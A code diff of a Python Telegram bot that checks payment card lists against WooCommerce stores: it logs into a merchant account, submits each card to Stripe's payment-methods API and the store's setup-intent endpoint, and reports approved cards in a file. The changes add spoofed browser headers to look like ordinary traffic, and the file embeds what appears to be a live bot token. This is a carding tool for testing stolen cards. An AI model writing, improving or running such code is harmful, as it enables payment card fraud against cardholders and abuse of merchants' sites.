@@ -4,16 +4,26 @@ import re
 import time
 import threading
 from bs4 import BeautifulSoup
-from telegram import Update
+from telegram import Update, Document
 from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
 from io import BytesIO
 
-# Replace this with your bot token
-BOT_TOKEN = "7615802418:AAFmsHTQP7_2iNEve7-aa6A6LNA4V2GfuDs"
+BOT_TOKEN = "7615802418:AAFmsHTQP7_2iNEve7-aa6A6LNA4V2GfuDs"  # <-- REPLACE THIS WITH YOUR BOT TOKEN
 
 logging.basicConfig(level=logging.INFO)
 user_sites = {}
 lock = threading.Lock()
+
+HEADERS = {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
+    'Accept-Language': 'en-US,en;q=0.5',
+    'Referer': 'https://google.com',
+    'Connection': 'keep-alive'
+}
+
+def sanitize_site(site):
+    return site.replace("https://", "").replace("http://", "").split("/")[0]
 
 def detect_stripe_type(soup):
     if "setup_intent" in soup.text:
@@ -26,8 +36,9 @@ def detect_stripe_type(soup):
         return "token"
     return "unknown"
 
-def try_login(email, password, login_url, session):
-    r = session.get(login_url)
+def try_login(email, password, site, session):
+    login_url = f"https://{site}/my-account/"
+    r = session.get(login_url, headers=HEADERS)
     soup = BeautifulSoup(r.text, 'html.parser')
     nonce = soup.find("input", {"name": "woocommerce-login-nonce"})
     referer = soup.find("input", {"name": "_wp_http_referer"})
@@ -43,7 +54,7 @@ def try_login(email, password, login_url, session):
         'login': 'Log in'
     }
 
-    r = session.post(login_url, data=payload)
+    r = session.post(login_url, data=payload, headers=HEADERS)
     return ("customer-logout" in r.text), r
 
 async def addsitelogin(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -56,10 +67,10 @@ async def addsitelogin(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     try:
         site, email, password = args[0].split("|")
+        site = sanitize_site(site)
         session = requests.Session()
-        login_url = f"https://{site}/my-account/"
 
-        success, resp = try_login(email, password, login_url, session)
+        success, resp = try_login(email, password, site, session)
         if not success:
             await update.message.reply_text(f"Login failed: {resp}")
             return
@@ -78,8 +89,8 @@ async def addsitelogin(update: Update, context: ContextTypes.DEFAULT_TYPE):
             }
 
         await update.message.reply_text(
-            f"✅ Site login for `{site}` saved!\n"
-            f"Detected Stripe Method: `{stripe_type}`"
+            f"𝐒𝐢𝐭𝐞 𝐥𝐨𝐠𝐢𝐧 𝐜𝐫𝐞𝐝𝐞𝐧𝐭𝐢𝐚𝐥𝐬 𝐟𝐨𝐫 {site} 𝐡𝐚𝐯𝐞 𝐛𝐞𝐞𝐧 𝐬𝐚𝐯𝐞𝐝 ✅\n"
+            f"𝐒𝐭𝐫𝐢𝐩𝐞 𝐌𝐞𝐭𝐡𝐨𝐝 𝐃𝐞𝐭𝐞𝐜𝐭𝐞𝐝: `{stripe_type}`"
         )
     except Exception as e:
         await update.message.reply_text(f"Error: {str(e)}")
@@ -94,41 +105,34 @@ def parse_card(card):
             return match.groups()
     return None
 
-def extract_pk_live(html):
-    found = re.findall(r'pk_live_[A-Za-z0-9]+', html)
-    return found[0] if found else None
-
 def process_card(card, user_data):
     try:
         parsed = parse_card(card)
         if not parsed:
             return f"{card} -> Invalid format ❌"
         card_number, exp_month, exp_year, cvv = parsed
-
         site = user_data["site"]
         email = user_data["email"]
         password = user_data["password"]
         stripe_type = user_data["stripe_type"]
 
         login_url = f"https://{site}/my-account/"
+        check_url = f"https://{site}/my-account/add-payment-method/"
+        ajax_url = f"https://{site}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent"
+
         session = requests.Session()
-        success, _ = try_login(email, password, login_url, session)
+        success, _ = try_login(email, password, site, session)
         if not success:
             return f"{card} -> Login failed ❌"
 
-        check_url = f"https://{site}/my-account/add-payment-method/"
-        resp = session.get(check_url)
+        resp = session.get(check_url, headers=HEADERS)
         ajax_nonce = re.search(r'"createAndConfirmSetupIntentNonce":"(\w+)"', resp.text)
         if not ajax_nonce:
-            return f"{card} -> Ajax nonce not found ❌"
+            return f"{card} -> Could not extract ajax nonce ❌"
 
-        pk_live = extract_pk_live(resp.text)
-        if not pk_live:
-            return f"{card} -> pk_live not found ❌"
-
-        stripe_resp = requests.post(
+        pm_resp = requests.post(
             'https://api.stripe.com/v1/payment_methods',
-            headers={'Authorization': f'Bearer {pk_live}'},
+            headers={'Authorization': 'Bearer pk_live_xxx'},
             data={
                 'type': 'card',
                 'card[number]': card_number,
@@ -138,12 +142,12 @@ def process_card(card, user_data):
                 'billing_details[address][postal_code]': '10001'
             }
         )
-        stripe_json = stripe_resp.json()
-        if 'error' in stripe_json:
-            return f"{card} -> Declined ❌ - {stripe_json['error']['message']}"
 
-        payment_method = stripe_json['id']
-        ajax_url = f"https://{site}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent"
+        pm_json = pm_resp.json()
+        if 'error' in pm_json:
+            return f"{card} -> Declined ❌ - {pm_json['error']['message']}"
+
+        payment_method = pm_json['id']
         payload = {
             'action': 'create_and_confirm_setup_intent',
             'wc-stripe-payment-method': payment_method,
@@ -202,7 +206,7 @@ async def mchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
             stats["errors"] += 1
 
         await msg.edit_text(
-            f"Checked: {stats['total']} | ✅ {stats['approved']} | ❌ {stats['declined']} | ⚠️ {stats['errors']}"
+            f"𝐓𝐨𝐭𝐚𝐥: {stats['total']} | ✅ {stats['approved']} | ❌ {stats['declined']} | ⚠️ {stats['errors']}"
         )
 
     await update.message.reply_document(document=BytesIO(open("approved.txt", "rb").read()), filename="approved.txt")
@@ -211,7 +215,7 @@ def main():
     app = ApplicationBuilder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("addsitelogin", addsitelogin))
     app.add_handler(CommandHandler("chk", chk))
-    app.add_handler(MessageHandler(filters.Document.ALL & filters.Document.MimeType("text/plain"), mchk))
+    app.add_handler(MessageHandler(filters.Document.FILE_EXTENSION("txt"), mchk))
     app.run_polling()
 
 if __name__ == "__main__":
